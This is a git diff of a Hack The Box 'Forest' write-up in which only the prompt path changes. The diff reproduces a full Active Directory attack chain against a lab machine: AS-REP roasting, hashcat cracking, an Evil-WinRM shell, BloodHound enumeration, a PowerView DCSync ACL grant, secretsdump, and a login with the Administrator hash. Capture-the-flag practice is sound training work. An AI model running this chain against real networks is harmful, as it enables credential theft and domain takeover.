@@ -31,7 +31,7 @@ tags:
 ### TCP
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.161
+luc@kali:~/HTB/Forest$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.161
 ```
 
 |Port|Service|
@@ -62,7 +62,7 @@ luc@kali:~/Documents/Cyber-security/HTB/Forest$ nmap -vv --reason -Pn -A --ossca
 ### UDP
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all 10.10.10.161
+luc@kali:~/HTB/Forest$ nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all 10.10.10.161
 ```
 
 |Port|Service|
@@ -73,7 +73,7 @@ luc@kali:~/Documents/Cyber-security/HTB/Forest$ nmap -vv --reason -Pn -sU -A --t
 ## Enumerate users via RPC
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ rpcclient -U "" -N 10.10.10.161
+luc@kali:~/HTB/Forest$ rpcclient -U "" -N 10.10.10.161
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
 ...
@@ -90,7 +90,7 @@ user:[santi] rid:[0x480]
 Accounts that don't require pre authentication can be abused to get valid password hashes. GetNPUsers.py can be used to get these hashes.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb/svc-alfresco -no-pass -dc-ip 10.10.10.161
+luc@kali:~/HTB/Forest$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb/svc-alfresco -no-pass -dc-ip 10.10.10.161
 /usr/share/doc/python3-impacket/examples/GetNPUsers.py:413: SyntaxWarning: "is" with a literal. Did you mean "=="?
   if domain is '':
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -102,8 +102,8 @@ $krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71
 Hashcat can be used to crack this hash
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ echo '$krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71c676a307e0db178deb302602782d260da7f979cd9693e7001d58ecd9233612ee969ce7e7c6de1f9832a3c5e1fbf6ce93389d6e177597d39bd93d349785a3a0b5090a557c5f8ec62c2be318e9217823678f8eb0b0d455f1e44e03760be3d0887eedacbb087327abe44d760f9101e72f2e47ab1bc480e7e355b15457f6e1b3703831c6980d1603a32587f2dce5ef87c1f6e75c466a4780c9e41acd39b86bfb1d5d3928b1991844293f2eb68e89a2e62aa9e28fb155f8b21407dbd7b32ff195ae4cb27d4c433e90544d775e2a5a476e8ca85b72b487c70e04' > hashes
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
+luc@kali:~/HTB/Forest$ echo '$krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71c676a307e0db178deb302602782d260da7f979cd9693e7001d58ecd9233612ee969ce7e7c6de1f9832a3c5e1fbf6ce93389d6e177597d39bd93d349785a3a0b5090a557c5f8ec62c2be318e9217823678f8eb0b0d455f1e44e03760be3d0887eedacbb087327abe44d760f9101e72f2e47ab1bc480e7e355b15457f6e1b3703831c6980d1603a32587f2dce5ef87c1f6e75c466a4780c9e41acd39b86bfb1d5d3928b1991844293f2eb68e89a2e62aa9e28fb155f8b21407dbd7b32ff195ae4cb27d4c433e90544d775e2a5a476e8ca85b72b487c70e04' > hashes
+luc@kali:~/HTB/Forest$ hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
 ...
 $krb5asrep$23$svc-alfresco@HTB:15115157097d426a68bb3ba3bef3556a$3c43a347e7987d71c676a307e0db178deb302602782d260da7f979cd9693e7001d58ecd9233612ee969ce7e7c6de1f9832a3c5e1fbf6ce93389d6e177597d39bd93d349785a3a0b5090a557c5f8ec62c2be318e9217823678f8eb0b0d455f1e44e03760be3d0887eedacbb087327abe44d760f9101e72f2e47ab1bc480e7e355b15457f6e1b3703831c6980d1603a32587f2dce5ef87c1f6e75c466a4780c9e41acd39b86bfb1d5d3928b1991844293f2eb68e89a2e62aa9e28fb155f8b21407dbd7b32ff195ae4cb27d4c433e90544d775e2a5a476e8ca85b72b487c70e04:s3rvice
 ...
@@ -116,7 +116,7 @@ The password for the user `svc-alfresco` is `s3rvice`.
 These credentials can be used to get a shell via `Evil-WinRM` and to read the user.txt file
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+luc@kali:~/HTB/Forest$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 
 Evil-WinRM shell v2.3
 
@@ -130,7 +130,7 @@ e5e4e47a************************
 ## Privilege escalation
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ cp /opt/BloodHound/Ingestors/SharpHound.ps1 .
+luc@kali:~/HTB/Forest$ cp /opt/BloodHound/Ingestors/SharpHound.ps1 .
 ```
 
 ```bash
@@ -166,7 +166,7 @@ Info: Download successful!
 Before starting Bloodhound we have to start Neo4j
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ sudo neo4j console
+luc@kali:~/HTB/Forest$ sudo neo4j console
 ```
 
 ![Neo4j login](/assets/images/HTB-Forest/1.a%20neo4j%20login.png)
@@ -187,7 +187,7 @@ We need to use the dev branch of `PowerSploit` to use the `Add-DomainObjectAcl` 
 
 ```bash
 luc@kali:/opt$ sudo git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ cp /opt/PowerSploit/Recon/PowerView.ps1 .
+luc@kali:~/HTB/Forest$ cp /opt/PowerSploit/Recon/PowerView.ps1 .
 ```
 
 ```bash
@@ -210,11 +210,11 @@ The command completed successfully.
 Now that we've DCSync rights we can use `secretsdump.py` to get all hashes and we can use those to get a shell via `Evil-WinRM`.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+luc@kali:~/HTB/Forest$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 ...
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
 ...
-luc@kali:~/Documents/Cyber-security/HTB/Forest$ evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+luc@kali:~/HTB/Forest$ evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 
 Evil-WinRM shell v2.3
 
